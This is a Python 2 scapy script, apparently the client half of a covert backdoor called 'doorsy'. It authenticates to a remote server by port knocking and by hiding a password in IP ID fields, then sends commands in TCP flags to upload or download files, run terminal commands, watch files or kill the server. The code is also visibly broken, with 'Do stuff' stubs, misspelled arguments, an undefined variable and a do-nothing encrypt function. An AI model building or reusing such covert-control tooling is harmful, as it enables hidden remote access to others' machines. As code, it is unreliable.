'''
--------------------------------------------------------------------------------------------
-- SCRIPT: doorsy-client.py
-- 
-- FUNCTIONS: main
-- 
-- DATE: 2014-11-09
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- NOTES: 
-- 
---------------------------------------------------------------------------------------------
'''
from scapy.all import *
import os
import random

'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: main
-- 
-- DATE: 2014-11-09
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: main()
-- 
-- RETURNS: void
-- 
-- NOTES: 
-- 
---------------------------------------------------------------------------------------------
'''
def main():
	address = "127.0.0.1"
	port = 0
	password = ""
	knock = []
	warnings = ""

	# Making sure we're running in root
	if os.geteuid() != 0:
		print "Program must be run as root"
		return

	while True:
		os.system("clear")
		print warnings
		warnings = ""

		print "Server Address:  " + address
		print "Port: " + str(port)
		print "Password:        " + password
		print "Knock Sequence:  " + str(knock)
		print " "
		print "-Commands-"
		print "A - change server address"
		print "D - change command port"
		print "P - change password"
		print "K - change knock sequence"
		print "R - Run Connection Sequence"
		print "Q - Exit program"
		print "Input Command: "

		choice = raw_input()
		if choice == 'A' or choice == 'a':
			print "Input new server address: "
			address = raw_input()
		elif choice == 'D' or choice == 'd':
			print "Input new Port: "
			port = raw_input()
		elif choice == 'P' or choice == 'p':
			print "Input new Password: "
			password = raw_input()
		elif choice == 'K' or choice == 'k':
			print "Input new Port Knock sequence."
			print "Each port number should be comma deliminated: "
			ports = raw_input()
			knock[:] = []
			for port in ports.split(","):
				knock.append(int(port))
		elif choice == 'R' or choice == 'r':
			# Making sure we have at least 1 password or knock.
			# We need either a password or a knock in order for remote access to work
			if len(password) < 1 and len(knock) < 1:
				warnings = warnings + "Must have a password or knock sequence to connect to a server\n"
			else:
				try:
					sendKnock(address, password, knock)
					if checkAuthenticate(address, port):
						sendCommand(address, port)
				except KeyboardInterrupt:
					print "Shutting Down"
				continue
		elif choice == 'Q' or choice == "q":
			return
		else:
			warnings = warnings + "Invalid input\n"
		print "\n"

'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: sendKnock
-- 
-- DATE: 2014-11-09
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: sendKnock(address, password, knock)
--              address - The address of the server
--              password - The password, if any, which will be used to autheticate to the server
--              knock - The knock sequence, if any, which will be used to autheticate to the server
-- 
-- RETURNS: Returns true on successful connection, otherwise False
-- 
-- NOTES: 
-- 
---------------------------------------------------------------------------------------------
'''
def sendKnock(address, password, knock):
	seq = random.randint(0, 16777215)
	idpass = random.randint(0, 127)

	if len(knock) < 1:
		for c in password:
			port = random.randint(0, 65535)
			knockPacket = IP(dst=address, id=(idpass<<8) + ord(c))/\
			              TCP(sport=random.randint(0, 65535), dport=port, seq=seq)
			seq += 1
			idpass += 1

			send(knockPacket, verbose=0)
	else:
		ipid = random.randint(0, 65535)
		c = 0
		for port in knock:
			ipHead = IP(dst=address)
			if len(password) > 0 and c < len(password):
				ipHead.id = (idpass<<8) + ord(password[c])
				c += 1
				idpass += 1
				ipid = ipHead.id
			else:
				ipHead.id = ipid
				ipid += 1
			knockPacket = ipHead/\
			              TCP(sport=random.randint(0, 65535), dport=port, seq=seq)
			seq += 1

			send(knockPacket, verbose=0)

'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: checkAuthenticate
-- 
-- DATE: 2014-11-14
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: checkAuthenticate(address, port)
--              address - The address of the server
--              port - The port to which packets should be sent
-- 
-- RETURNS: Returns true on auth packet received, otherwise false
-- 
-- NOTES: 
-- 
---------------------------------------------------------------------------------------------
'''
def checkAuthenticate(address, port):
	packetFilter = ""
	packetFilter = "tcp and ip src " + address
	
	packets = sniff(count=1, filter=packetFilter, timeout=10)

	if len(packets) == 0:
		return False
	else:
		return True

'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: sendCommand
-- 
-- DATE: 2014-11-14
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: sendCommand(address, port)
--              address - The address of the server
--              port - The port to which packets should be sent
-- 
-- RETURNS: N/A
-- 
-- NOTES: 
-- 
---------------------------------------------------------------------------------------------
'''
def sendCommand(address, port):
	warings = ""
	while True:
		os.system("clear")
		print warnings
		warnings = ""

		print "Connected to " + address
		print "-Server Commands-"
		print "U - Upload file"
		print "D - Download file"
		print "T - Terminal Command"
		print "I - iNotify*"
		print "K - Kill Server*"
		print "Note: These actions will terminate the client's connection to the server"
		print "Input Command: "

		choice = raw_input()
		if choice == 'U' or choice == 'u':
			print "Input file to upload: "
			sFile = raw_input()
			sendFile(address, port, sFile)
		elif choice == 'D' or choice == 'd':
			print "Input file to download: "
			gFile = raw_input()
			getFile(address, port, gFile)
		elif choice == 'T' or choice == 't':
			print "Input terminal command: "
			command = raw_input()
			terminal(address, port, command)
		elif choice == 'I' or choice == 'i':
			print "Input file or directory to be watched: "
			notice = raw_input()
			notify(address, port, notice)
			return
		elif choice == 'K' or choice == 'k':
			print "Terminating Server..."
			kill(address, port)
			return
		else:
			warnings = warnings + "Invalid input\n"
		print "\n"

# --Server Codes--
#       A S F 
#       C Y I 
#       K N N Flag
# sFile 0 0 0 N/A
# gFile 1 0 0 A
# termi 0 1 0 S
# iNoti 1 1 0 AS
# Kill  0 0 1 F

'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: sendFile
-- 
-- DATE: 2014-11-14
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: sendFile(address, port, sFile)
--              address - The address of the server
--              port - The port to which packets should be sent
--              sFile - The directory and file to be sent
-- 
-- RETURNS: N/A
-- 
-- NOTES: 
-- 
---------------------------------------------------------------------------------------------
'''
def sendFile(address, port, sFile):
	print "Do stuff"
	commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
	                TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215))/\
	                raw(LOAD=encrypt(sFile))
	send(commandPacket, verose=0)

'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: getFile
-- 
-- DATE: 2014-11-14
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: getFile(address, port, gFile)
--              address - The address of the server
--              port - The port to which packets should be sent
-- 
-- RETURNS: N/A
-- 
-- NOTES: 
-- 
---------------------------------------------------------------------------------------------
'''
def getFile(address, port, gFile):
	print "Do stuff"
	commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
	                TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215), flags="A")/\
	                RAW(load=encrypt(gFile))
	send(commandPacket, verose=0)

'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: terminal
-- 
-- DATE: 2014-11-14
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: terminal(address, port, command)
--              address - The address of the server
--              port - The port to which packets should be sent
--              command - The terminal command which should be run
-- 
-- RETURNS: N/A
-- 
-- NOTES: 
-- 
---------------------------------------------------------------------------------------------
'''
def terminal(address, port, command):
	print "Do stuff"
	commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
	                TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215), flags="S")/\
	                RAW(load=encrypt(command))
	send(commandPacket, verose=0)

'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: notify
-- 
-- DATE: 2014-11-14
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: notify(address, port, notice)
--              address - The address of the server
--              port - The port to which packets should be sent
--              notice - The file or directory which should be monitored
-- 
-- RETURNS: N/A
-- 
-- NOTES: 
-- 
---------------------------------------------------------------------------------------------
'''
def notify(address, port, notice):
	print "Do stuff"
	commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
	                TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215), flags="AS")/\
	                RAW(load=encrypt(notice))
	send(commandPacket, verose=0)

'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: kill
-- 
-- DATE: 2014-11-14
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: kill(address, port)
--              address - The address of the server
--              port - The port to which packets should be sent
-- 
-- RETURNS: N/A
-- 
-- NOTES: 
-- 
---------------------------------------------------------------------------------------------
'''
def kill(address, port):
	commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
	                TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215), flags="F")
	send(commandPacket, verose=0)

'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: encrypt
-- 
-- DATE: 2014-11-14
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: encrypt(message)
--              message - The message to be encrypted or decryped
-- 
-- RETURNS: N/A
-- 
-- NOTES: 
-- 
---------------------------------------------------------------------------------------------
'''
def encrypt(message):
	return message

main()

